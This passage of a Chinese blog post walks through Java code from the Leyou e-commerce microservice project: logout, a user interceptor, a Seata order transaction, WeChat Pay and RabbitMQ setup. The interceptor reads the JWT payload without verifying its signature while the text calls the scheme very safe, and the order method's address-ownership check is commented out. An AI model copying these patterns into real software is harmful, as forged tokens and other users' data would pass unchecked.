userInfo.getUsername();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//将redis中token删除</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, COOKIE_NAME);</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isEmpty(token)) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;未知错误,未登录不该点到这个按钮&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                payload = JwtUtils.getInfoFromToken(token, jwtProperties.getPublicKey(), UserInfo.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;不存在token?&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//3.获取cookie中的username</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="keyword">if</span> (userInfo == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;未知错误,未登录不该点到这个按钮&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            redisTemplate.delete(BaseRedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">            <span class="comment">//将cookie时间设置为0</span></span><br><span class="line">            CookieUtils.deleteCookie(COOKIE_NAME, DOMAIN, response);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (LyException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;未知错误,未登录不该点到这个按钮&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;退出登录失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//controller</span></span><br><span class="line"><span class="keyword">package</span> com.leyou.auth.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-06 9:31 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserAuthService service;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthController</span><span class="params">(UserAuthService service)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.service = service;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username 用户名</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password 密码</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span><br><span class="line"><span class="params">                                      <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span><br><span class="line"><span class="params">                                      HttpServletResponse response)</span> &#123;</span><br><span class="line">        service.login(username, password, response);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 验证用户信息</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用户信息</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/verify&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> service.verify(request);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok(username);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/logout&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        service.logout(request, response);</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="订单服务获取登陆用户信息实现"><a href="#订单服务获取登陆用户信息实现" class="headerlink" title="订单服务获取登陆用户信息实现"></a>订单服务获取登陆用户信息实现</h2><p>本项目采用系统设计的方案二：自己从cookie的token中解析用户信息，这种方案很安全。</p>
<p>ThreadLocal让用户与每一个请求线程绑定：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212120508.png" alt="image-20210704030245597"></p>
<p>关键代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-08 9:52 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserHolder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> ThreadLocal&lt;Long&gt; tl = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(Long id)</span>&#123;</span><br><span class="line">        tl.set(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Long <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">Long</span> <span class="variable">id</span> <span class="operator">=</span> tl.get();</span><br><span class="line">        <span class="keyword">if</span>(id == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">removeUser</span><span class="params">()</span>&#123;</span><br><span class="line">        tl.remove();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//mvc拦截器</span></span><br><span class="line"><span class="keyword">package</span> com.leyou.trade.interceptors;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.BaseTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.trade.utils.UserHolder;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-08 9:58 上午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取cookie中的token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, BaseTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="comment">// 获取token中的用户, 不需要公钥或私钥，直接解析载荷</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, UserInfo.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 保存用户</span></span><br><span class="line">            UserHolder.setUser(userInfo.getId());</span><br><span class="line">            <span class="comment">// 放行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">            <span class="comment">// 获取用户失败，无需向后走了</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;解析用户信息失败！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> &#123;</span><br><span class="line">        <span class="comment">// 业务结束后，移除ThreadLocal中的用户</span></span><br><span class="line">        UserHolder.removeUser();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="分布式事务实现"><a href="#分布式事务实现" class="headerlink" title="分布式事务实现"></a>分布式事务实现</h2><p>采用Seata解决方案，开启一个seata服务，将两个配置文件放到resource目录下</p>
<p>引入seata依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-alibaba-seata<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.seata<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>seata-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在分布式事务开启的方法上使用Globaltransaction注解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">   <span class="meta">@GlobalTransactional</span></span><br><span class="line">   <span class="keyword">public</span> Long <span class="title function_">createOrder</span><span class="params">(OrderFormDTO orderFormDTO)</span> &#123;</span><br><span class="line">       <span class="comment">// 1.订单</span></span><br><span class="line">       <span class="type">Order</span> <span class="variable">order</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Order</span>();</span><br><span class="line">       <span class="comment">// 1.1.订单金额信息，包括：商品总金额、实付金额、邮费</span></span><br><span class="line">       Map&lt;Long, Integer&gt; carts = orderFormDTO.getCarts();</span><br><span class="line">       <span class="comment">// a.获取sku的id集合</span></span><br><span class="line">       Set&lt;Long&gt; ids = carts.keySet();</span><br><span class="line">       <span class="comment">// b.根据sku的id查询sku</span></span><br><span class="line">       List&lt;SkuDTO&gt; skuList = itemClient.querySkuByIds(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(ids));</span><br><span class="line">       <span class="comment">// c.计算总金额</span></span><br><span class="line">       <span class="type">long</span> <span class="variable">total</span> <span class="operator">=</span> <span class="number">0L</span>;</span><br><span class="line">       <span class="keyword">for</span> (SkuDTO sku : skuList) &#123;</span><br><span class="line">           <span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> carts.get(sku.getId());</span><br><span class="line">           total += sku.getPrice() * num;</span><br><span class="line">       &#125;</span><br><span class="line">       order.setTotalFee(total);</span><br><span class="line">       order.setPostFee(<span class="number">0L</span>);</span><br><span class="line">       order.setActualFee(order.getTotalFee() + order.getPostFee()<span class="comment">/*TODO 减去优惠金额*/</span>);</span><br><span class="line">       order.setPaymentType(orderFormDTO.getPaymentType());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.2.用户</span></span><br><span class="line">       <span class="type">Long</span> <span class="variable">userId</span> <span class="operator">=</span> UserHolder.getUser();</span><br><span class="line">       order.setUserId(userId);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.3.状态</span></span><br><span class="line">       order.setStatus(OrderStatus.INIT);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 1.4.写入数据库</span></span><br><span class="line">       <span class="type">boolean</span> <span class="variable">isSuccess</span> <span class="operator">=</span> save(order);</span><br><span class="line">       <span class="keyword">if</span> (!isSuccess) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;新增订单失败！&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="type">Long</span> <span class="variable">orderId</span> <span class="operator">=</span> order.getOrderId();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 2.订单详情</span></span><br><span class="line">       List&lt;OrderDetail&gt; orderDetails = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(skuList.size());</span><br><span class="line">       <span class="comment">// 2.1.把sku集合封装成OrderDetail集合</span></span><br><span class="line">       <span class="keyword">for</span> (SkuDTO sku : skuList) &#123;</span><br><span class="line">           <span class="type">OrderDetail</span> <span class="variable">detail</span> <span class="operator">=</span> buildOrderDetailFromSku(sku, orderId, carts.get(sku.getId()));</span><br><span class="line">           orderDetails.add(detail);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 2.2.写入数据库</span></span><br><span class="line">       detailService.saveBatch(orderDetails);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3.物流</span></span><br><span class="line">       <span class="comment">// 3.1.获取地址的id</span></span><br><span class="line">       <span class="type">Long</span> <span class="variable">addressId</span> <span class="operator">=</span> orderFormDTO.getAddressId();</span><br><span class="line">       <span class="comment">// 3.2.根据id查询地址</span></span><br><span class="line">       <span class="type">AddressDTO</span> <span class="variable">address</span> <span class="operator">=</span> userClient.queryAddressById(addressId);</span><br><span class="line">       <span class="comment">// 判断当前地址是否属于当前用户</span></span><br><span class="line">      <span class="comment">/* if(!Objects.equals(address.getUserId(), userId))&#123;</span></span><br><span class="line"><span class="comment">           // 地址不属于当前用户，数据有误</span></span><br><span class="line"><span class="comment">           throw new LyException(400, &quot;请不要瞎搞，收货地址不是你的！&quot;);</span></span><br><span class="line"><span class="comment">       &#125;*/</span></span><br><span class="line">       <span class="comment">// 3.3.封装OrderLogistics，从address中拷贝属性到OrderLogistics</span></span><br><span class="line">       <span class="type">OrderLogistics</span> <span class="variable">orderLogistics</span> <span class="operator">=</span> address.toEntity(OrderLogistics.class);</span><br><span class="line">       orderLogistics.setOrderId(orderId);</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 3.4.写入数据库</span></span><br><span class="line">       isSuccess = logisticsService.save(orderLogistics);</span><br><span class="line">       <span class="keyword">if</span> (!isSuccess) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">500</span>, <span class="string">&quot;新增订单失败！&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 4.减库存</span></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           itemClient.deductStock(carts);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8());</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// 5.发送延迟消息到交换机</span></span><br><span class="line">       amqpTemplate.convertAndSend(ORDER_EXCHANGE_NAME, EVICT_ORDER_KEY, orderId);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> orderId;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>



<h2 id="微信支付实现"><a href="#微信支付实现" class="headerlink" title="微信支付实现"></a>微信支付实现</h2><p>部分代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPay;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayConfigImpl;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayConstants;</span><br><span class="line"><span class="keyword">import</span> com.github.wxpay.sdk.WXPayUtil;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.trade.constants.PayConstants.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PayHelper</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WXPay wxPay;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WXPayConfigImpl payConfig;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PayHelper</span><span class="params">(WXPay wxPay, WXPayConfigImpl payConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.wxPay = wxPay;</span><br><span class="line">        <span class="built_in">this</span>.payConfig = payConfig;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">unifiedOrder</span><span class="params">(Long orderId, Long totalFee)</span>&#123;</span><br><span class="line">        <span class="comment">// 1.准备请求参数：</span></span><br><span class="line">        Map&lt;String, String&gt; data = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        <span class="comment">// 商品描述</span></span><br><span class="line">        data.put(<span class="string">&quot;body&quot;</span>, ORDER_DESC);</span><br><span class="line">        <span class="comment">// 商家的订单编号</span></span><br><span class="line">        data.put(ORDER_NO_KEY, orderId.toString());</span><br><span class="line">        <span class="comment">// 支付总金额，单位是分</span></span><br><span class="line">        data.put(TOTAL_FEE_KEY, totalFee.toString());</span><br><span class="line">        <span class="comment">// 终端IP：当前请求发起者的IP</span></span><br><span class="line">        data.put(<span class="string">&quot;spbill_create_ip&quot;</span>, payConfig.getSpbillCreateIp());</span><br><span class="line">        <span class="comment">// 此处指定为扫码支付</span></span><br><span class="line">        data.put(<span class="string">&quot;trade_type&quot;</span>, UNIFIED_ORDER_TRADE_TYPE);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 2.下单，得到结果</span></span><br><span class="line">            Map&lt;String, String&gt; resp = wxPay.unifiedOrder(data);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 3.验证签名</span></span><br><span class="line">            isSignatureValid(resp);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 4.校验return_code</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="string">&quot;FAIL&quot;</span>.equals(resp.get(<span class="string">&quot;return_code&quot;</span>)))&#123;</span><br><span class="line">                <span class="comment">// 业务失败，抛出异常</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;业务执行失败！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 5.校验result_code</span></span><br><span class="line">            isResultSuccess(resp);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 6.获取支付链接</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> resp.get(PAY_URL_KEY);</span><br><span class="line">            <span class="keyword">if</span>(StringUtils.isBlank(url))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;支付链接为空！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> url;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;统一下单失败! &quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">isResultSuccess</span><span class="params">(Map&lt;String, String&gt; resp)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;FAIL&quot;</span>.equals(resp.get(<span class="string">&quot;result_code&quot;</span>)))&#123;</span><br><span class="line">            <span class="comment">// 业务失败，抛出异常</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;业务执行失败！&quot;</span> + resp.get(<span class="string">&quot;err_code_des&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">isSignatureValid</span><span class="params">(Map&lt;String, String&gt; data)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isValid</span> <span class="operator">=</span> WXPayUtil.isSignatureValid(data, payConfig.getKey(), WXPayConstants.SignType.HMACSHA256);</span><br><span class="line">            <span class="keyword">if</span>(!isValid)&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;签名无效&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;签名错误，无效数据！&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="订单清理实现"><a href="#订单清理实现" class="headerlink" title="订单清理实现"></a>订单清理实现</h2><p>配置队列和交换机：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.trade.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.core.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.DEAD_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.ExchangeConstants.ORDER_EXCHANGE_NAME;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.DEAD_ORDER_QUEUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.QueueConstants.EVICT_ORDER_QUEUE;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.leyou.common.constants.BaseMQConstants.RoutingKeyConstants.EVICT_ORDER_KEY;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-06-13 11:19 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MqConfig</span> &#123;</span><br><span class="line">    <span class="comment">// 30分钟</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">ORDER_QUEUE_DELAY_TIME</span> <span class="operator">=</span> <span class="number">30000</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ly-order-exchange 普通任务交换机，将消息转发到死信队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> TopicExchange <span class="title function_">orderExchange</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TopicExchange</span>(ORDER_EXCHANGE_NAME, <span class="literal">true</span>, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ly-dead-exchange 死信交换机，接收死信队列转过来的消息，并投递给任务队列</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> 